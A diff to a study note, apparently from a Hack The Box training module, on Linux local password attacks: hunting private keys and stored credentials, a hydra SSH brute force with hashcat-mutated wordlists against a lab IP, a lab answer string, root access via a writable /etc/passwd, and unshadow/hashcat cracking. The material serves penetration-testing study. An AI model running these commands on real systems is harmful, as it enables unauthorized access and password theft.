@@ -1,5 +1,7 @@
 # ❇️ Linux Local Password Attacks
 
+## Credential Hunting
+
 There are several sources that can provide us with credentials that we put in four categories. These include, but are not limited to:
 
 | **`Files`**  | **`History`**        | **`Memory`**         | **`Key-Rings`**            |
@@ -75,7 +77,7 @@ Since the SSH keys can be named arbitrarily, we cannot search them for specific 
 Private Key ->
 
 ```shell-session
-grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1
+grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
 ```
 
 Public key ->
@@ -163,4 +165,111 @@ Alternatively, `LaZagne` can also return results if the user has used the suppor
 
 ```shell-session
 python3 laZagne.py browsers
+```
+
+_**Examine the target and find out the password of the user Will. Then, submit the password as the answer.**_
+
+```
+hashcat --force kira.list -r custom.rule --stdout | sort -u > mut_pass.list
+```
+
+```
+hydra -l kira -P mut_pass.list ssh://10.129.199.132 -t 64
+```
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+So i download it on my local machine, transfer the python file on the target machine and launch my attack ->
+
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption><p>TUqr7QfLTLhruhVbCP</p></figcaption></figure>
+
+## Passwd, Shadow & Opasswd
+
+### Passwd file
+
+Linux-based distributions can use many different authentication mechanisms. One of the most commonly used and standard mechanisms is [Pluggable Authentication Modules](https://web.archive.org/web/20220622215926/http://www.linux-pam.org/Linux-PAM-html/Linux-PAM\_SAG.html) (`PAM`). The modules used for this are called `pam_unix.so` or `pam_unix2.so` and are located in `/usr/lib/x86_x64-linux-gnu/security/` in Debian based distributions.
+
+These modules manage user information, authentication, sessions, current passwords, and old passwords.
+
+The `/etc/passwd` file contains information about every existing user on the system and can be read by all users and services. Here is the format ->
+
+| `cry0l1t3` | `:` | `x`           | `:` | `1000` | `:` | `1000` | `:` | `cry0l1t3,,,`      | `:` | `/home/cry0l1t3` | `:` | `/bin/bash` |
+| ---------- | --- | ------------- | --- | ------ | --- | ------ | --- | ------------------ | --- | ---------------- | --- | ----------- |
+| Login name |     | Password info |     | UID    |     | GUID   |     | Full name/comments |     | Home directory   |     | Shell       |
+
+Usually, we find the value `x` in the **password info field**, which means that the passwords are stored in an encrypted form in the `/etc/shadow` file. However, it can also be that the `/etc/passwd` file is writeable by mistake. This would allow us to clear this field for the user `root` so that the password info field is empty. This will cause the system not to send a password prompt when a user tries to log in as `root`.
+
+Before ->
+
+```shell-session
+root:x:0:0:root:/root:/bin/bash
+```
+
+after ->
+
+```shell-session
+root::0:0:root:/root:/bin/bash
+```
+
+Exploiting it ->
+
+```shell-session
+[cry0l1t3@parrot]─[~]$ head -n 1 /etc/passwd
+
+root::0:0:root:/root:/bin/bash
+
+
+[cry0l1t3@parrot]─[~]$ su
+
+[root@parrot]─[/home/cry0l1t3]#
+```
+
+### Shadow File
+
+This file contains all the password information for the created users and is only readable by users who have administrator rights.
+
+Here is the format
+
+| `cry0l1t3` | `:` | `$6$wBRzy$...SNIP...x9cDWUxW1` | `:` | `18937`        | `:` | `0`         | `:` | `99999`     | `:` | `7`            | `:`               | `:`             | `:`    |
+| ---------- | --- | ------------------------------ | --- | -------------- | --- | ----------- | --- | ----------- | --- | -------------- | ----------------- | --------------- | ------ |
+| Username   |     | Encrypted password             |     | Last PW change |     | Min. PW age |     | Max. PW age |     | Warning period | Inactivity period | Expiration date | Unused |
+
+f the password field contains a character, such as `!` or `*`, the user cannot log in with a Unix password. However, other authentication methods for logging in, such as Kerberos or key-based authentication, can still be used.
+
+The `encrypted password` also has a particular format by which we can also find out some information
+
+* `$<type>$<salt>$<hashed>`
+
+Here are the different types possible ->
+
+* `$1$` – MD5
+* `$2a$` – Blowfish
+* `$2y$` – Eksblowfish
+* `$5$` – SHA-256
+* `$6$` – SHA-512
+
+### Opasswd
+
+The file where old passwords are stored is the `/etc/security/opasswd`. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.
+
+### Cracking Linux Credentials
+
+```shell-session
+ElFelixi0@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
+ElFelixi0@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
+ElFelixi0@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
+```
+
+And then we can launch hashcat ->
+
+```shell-session
+ElFelixi0@htb[/htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
+```
+
+And if we have md5 hashes ->
+
+```shell-session
+hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
 ```
